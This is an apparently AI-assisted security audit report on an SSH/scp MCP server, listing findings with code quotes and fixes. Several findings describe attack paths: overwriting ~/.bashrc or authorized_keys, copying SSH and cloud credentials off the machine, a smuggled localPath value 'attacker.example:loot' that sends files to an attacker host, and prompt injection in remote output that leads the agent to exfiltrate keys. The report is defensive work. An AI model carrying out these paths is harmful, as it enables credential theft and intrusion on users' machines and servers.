# Agent & MCP security report

Scanned: `/tmp/blind/c39` · 2026-11-23T20:40:34+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 1 | 4 | 0 | 2 | 0 | 0 | 1 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **7** · agent/MCP code files: **1** · agent instruction files: **1**
- Frameworks seen: mcp, modelcontextprotocol

## Findings

### M001 · CRITICAL · downloadFile writes to any local path (arbitrary local file overwrite)
`None:None` · ASI02 Tool Misuse and Exploitation

localPath is used as the scp destination with no directory restriction, so an injected call can first write a payload on a known host with runRemoteCommand and then downloadFile it over ~/.bashrc, ~/.ssh/authorized_keys or ~/.ssh/config (e.g. adding a ProxyCommand), giving code execution on the user's own machine.
> `server.mjs:782` — `args.localPath`
> `server.mjs:531` — `await this._execFileAsync(SCP_BIN, ['-o', 'StrictHostKeyChecking=accept-new', '--', `${hostAlias}:${remotePath}`, localPath], options);`

**Fix:** Restrict localPath to a configured download directory: path.resolve + fs.realpath of the parent, require path.relative(root, target) not to start with '..', refuse existing files unless overwrite is explicitly confirmed, and reject paths containing ':' before the first '/'.

### M002 · HIGH · uploadFile reads any local file (SSH keys, cloud credentials) and copies it off the machine
`None:None` · ASI02 Tool Misuse and Exploitation

localPath has no allowlist, so localPath=~/.ssh/id_ed25519 or ~/.aws/credentials is copied to a remote host where runRemoteCommand can read it back or send it anywhere.
> `server.mjs:770` — `args.localPath,`
> `server.mjs:513` — `await this._execFileAsync(SCP_BIN, ['-o', 'StrictHostKeyChecking=accept-new', '--', localPath, `${hostAlias}:${remotePath}`], options);`

**Fix:** Limit uploads to a configured directory (realpath + containment check) and block ~/.ssh, ~/.aws, ~/.config and similar secret locations.

### M003 · HIGH · scp treats localPath containing 'host:' as a remote spec, bypassing the known-host allowlist
`None:None` · ASI02 Tool Misuse and Exploitation

Only hostAlias is checked against ~/.ssh/config/known_hosts; scp parses any operand with a ':' before the first '/' as a remote host, and '--' does not change that. downloadFile with localPath='attacker.example:loot' copies a file from the user's server straight to an attacker host (accepted via StrictHostKeyChecking=accept-new); uploadFile with localPath='attacker.example:x' pulls attacker content onto the server.
> `server.mjs:524` — `await this._assertKnownHostAlias(hostAlias);`
> `server.mjs:531` — `await this._execFileAsync(SCP_BIN, ['-o', 'StrictHostKeyChecking=accept-new', '--', `${hostAlias}:${remotePath}`, localPath], options);`

**Fix:** Reject localPath values that contain ':' before the first '/' (or prefix relative paths with './' and resolve to an absolute path), after the containment check from M001/M002.

### M004 · HIGH · runRemoteCommand / runCommandBatch run arbitrary shell commands on every configured and known host with no approval
`None:None` · ASI02 Tool Misuse / ASI05

By design any tool call executes any command on any host in ~/.ssh/config or ~/.ssh/known_hosts (so every host the user ever connected to), with stored @password credentials applied automatically; a prompt injection can therefore run destructive or exfiltrating commands on production servers. Local option/shell injection is properly blocked (hostAlias whitelist, '--', shell:false).
> `server.mjs:745` — `args.command,`
> `server.mjs:420` — `const child = this._spawn(SSH_BIN, ['-o', 'StrictHostKeyChecking=accept-new', '--', hostAlias, command], spawnOptions);`

**Fix:** Require human approval in the client for these tools, add an opt-in allowlist of hosts (not all of known_hosts) and optionally a command allowlist / read-only mode.

### M005 · HIGH · Untrusted remote output + local secrets + outbound copy in one server
`None:None` · ASI01 / ASI02 (untrusted input + private data + way out)

Command output from remote hosts (logs, files, web content) goes straight into the model; injected text there can make the model uploadFile ~/.ssh keys and then curl them out with runRemoteCommand, with no approval step.
> `server.mjs:749` — `content: [{ type: "text", text: JSON.stringify(result, null, 2) }],`
> `server.mjs:513` — `await this._execFileAsync(SCP_BIN, ['-o', 'StrictHostKeyChecking=accept-new', '--', localPath, `${hostAlias}:${remotePath}`], options);`

**Fix:** Fix M001-M003, mark remote output as untrusted data, and require approval for file transfers and commands.

### M006 · LOW · Remote command output returned unmarked
`None:None` · 

stdout/stderr of remote commands (which can contain attacker-written text such as log lines) enters the model context as-is.
> `server.mjs:749` — `content: [{ type: "text", text: JSON.stringify(result, null, 2) }],`

**Fix:** Wrap output in untrusted-content delimiters.

### M007 · LOW · Host keys of new hosts accepted automatically
`None:None` · 

First connections to config hosts (and attacker-chosen hosts via M003) accept any host key, so a network attacker on first use can impersonate the server and capture @password credentials.
> `server.mjs:420` — `'StrictHostKeyChecking=accept-new'`

**Fix:** Drop the override and rely on the user's ssh config, or make accept-new opt-in.

## Needs information from you

- M008 INSECURE-DEFAULT `None:None` — On multi-user Linux hosts with a shared /tmp, another local user can pre-create or race this predictable path; the script is executed by ssh as the current user with the password in its environment. Not a risk on single-user machines or per-user TMPDIR (macOS).

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
